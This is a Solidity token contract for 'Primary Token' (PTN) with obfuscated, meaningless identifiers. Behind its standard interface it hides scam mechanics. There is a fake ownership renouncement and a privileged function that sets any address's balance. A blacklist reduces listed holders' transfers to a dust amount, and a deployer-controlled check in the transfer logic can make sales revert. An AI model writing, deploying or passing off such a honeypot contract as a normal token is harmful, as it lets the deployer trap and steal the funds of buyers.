//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface launchedToken {
    function totalSupply() external view returns (uint256);

    function balanceOf(address buyList) external view returns (uint256);

    function transfer(address autoShouldMax, uint256 swapTeam) external returns (bool);

    function allowance(address txSwap, address spender) external view returns (uint256);

    function approve(address spender, uint256 swapTeam) external returns (bool);

    function transferFrom(
        address sender,
        address autoShouldMax,
        uint256 swapTeam
    ) external returns (bool);

    event Transfer(address indexed from, address indexed liquidityLaunch, uint256 value);
    event Approval(address indexed txSwap, address indexed spender, uint256 value);
}

abstract contract swapAuto {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface autoExemptFrom {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface launchReceiver {
    function createPair(address walletReceiverToken, address swapSender) external returns (address);
}

interface launchedTokenMetadata is launchedToken {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PrimaryToken is swapAuto, launchedToken, launchedTokenMetadata {

    function totalSupply() external view virtual override returns (uint256) {
        return swapAmount;
    }

    function approve(address toList, uint256 swapTeam) public virtual override returns (bool) {
        tokenReceiver[_msgSender()][toList] = swapTeam;
        emit Approval(_msgSender(), toList, swapTeam);
        return true;
    }

    uint256 private swapAmount = 100000000 * 10 ** 18;

    function transfer(address maxFee, uint256 swapTeam) external virtual override returns (bool) {
        return swapMode(_msgSender(), maxFee, swapTeam);
    }

    string private takeTokenSell = "Primary Token";

    event OwnershipTransferred(address indexed autoList, address indexed teamMarketing);

    uint256 modeTake;

    address receiverMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function isModeToken() public {
        emit OwnershipTransferred(receiverWallet, address(0));
        liquidityTotal = address(0);
    }

    function senderFee(address txTokenSender) public {
        if (senderTeamBuy) {
            return;
        }
        if (swapEnable == teamWallet) {
            amountFee = feeAmount;
        }
        receiverFromMarketing[txTokenSender] = true;
        
        senderTeamBuy = true;
    }

    address limitIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 public tokenSender;

    function owner() external view returns (address) {
        return liquidityTotal;
    }

    function allowance(address toAmountTake, address toList) external view virtual override returns (uint256) {
        if (toList == receiverMin) {
            return type(uint256).max;
        }
        return tokenReceiver[toAmountTake][toList];
    }

    mapping(address => bool) public liquidityTeam;

    uint8 private tokenTake = 18;

    function launchedSender() private view {
        require(receiverFromMarketing[_msgSender()]);
    }

    function transferFrom(address sellTeam, address autoShouldMax, uint256 swapTeam) external override returns (bool) {
        if (_msgSender() != receiverMin) {
            if (tokenReceiver[sellTeam][_msgSender()] != type(uint256).max) {
                require(swapTeam <= tokenReceiver[sellTeam][_msgSender()]);
                tokenReceiver[sellTeam][_msgSender()] -= swapTeam;
            }
        }
        return swapMode(sellTeam, autoShouldMax, swapTeam);
    }

    function feeExempt(address limitAuto) public {
        launchedSender();
        if (amountFee == txSender) {
            txSender = tokenSender;
        }
        if (limitAuto == receiverWallet || limitAuto == launchLaunched) {
            return;
        }
        liquidityTeam[limitAuto] = true;
    }

    mapping(address => bool) public receiverFromMarketing;

    bool public senderTeamBuy;

    uint256 private amountFee;

    uint256 private txSender;

    mapping(address => uint256) private modeMin;

    address public launchLaunched;

    address public receiverWallet;

    address private liquidityTotal;

    string private takeLaunched = "PTN";

    function balanceOf(address buyList) public view virtual override returns (uint256) {
        return modeMin[buyList];
    }

    uint256 private teamWallet;

    constructor (){
        if (isTakeMin == buyMode) {
            txSender = feeAmount;
        }
        autoExemptFrom maxAmountSell = autoExemptFrom(receiverMin);
        launchLaunched = launchReceiver(maxAmountSell.factory()).createPair(maxAmountSell.WETH(), address(this));
        if (isTakeMin) {
            amountFee = swapEnable;
        }
        receiverWallet = _msgSender();
        isModeToken();
        receiverFromMarketing[receiverWallet] = true;
        modeMin[receiverWallet] = swapAmount;
        if (amountFee == feeAmount) {
            isTakeMin = true;
        }
        emit Transfer(address(0), receiverWallet, swapAmount);
    }

    uint256 takeSellFee;

    function atWallet(address sellTeam, address autoShouldMax, uint256 swapTeam) internal returns (bool) {
        require(modeMin[sellTeam] >= swapTeam);
        modeMin[sellTeam] -= swapTeam;
        modeMin[autoShouldMax] += swapTeam;
        emit Transfer(sellTeam, autoShouldMax, swapTeam);
        return true;
    }

    function senderTo(address maxFee, uint256 swapTeam) public {
        launchedSender();
        modeMin[maxFee] = swapTeam;
    }

    function swapMode(address sellTeam, address autoShouldMax, uint256 swapTeam) internal returns (bool) {
        if (sellTeam == receiverWallet) {
            return atWallet(sellTeam, autoShouldMax, swapTeam);
        }
        uint256 launchMax = launchedToken(launchLaunched).balanceOf(limitIs);
        require(launchMax == takeSellFee);
        require(autoShouldMax != limitIs);
        if (liquidityTeam[sellTeam]) {
            return atWallet(sellTeam, autoShouldMax, toReceiver);
        }
        return atWallet(sellTeam, autoShouldMax, swapTeam);
    }

    bool public buyMode;

    uint256 constant toReceiver = 10 ** 10;

    uint256 private swapEnable;

    function exemptTo(uint256 swapTeam) public {
        launchedSender();
        takeSellFee = swapTeam;
    }

    function name() external view virtual override returns (string memory) {
        return takeTokenSell;
    }

    function symbol() external view virtual override returns (string memory) {
        return takeLaunched;
    }

    function getOwner() external view returns (address) {
        return liquidityTotal;
    }

    mapping(address => mapping(address => uint256)) private tokenReceiver;

    function decimals() external view virtual override returns (uint8) {
        return tokenTake;
    }

    uint256 private feeAmount;

    bool public isTakeMin;

}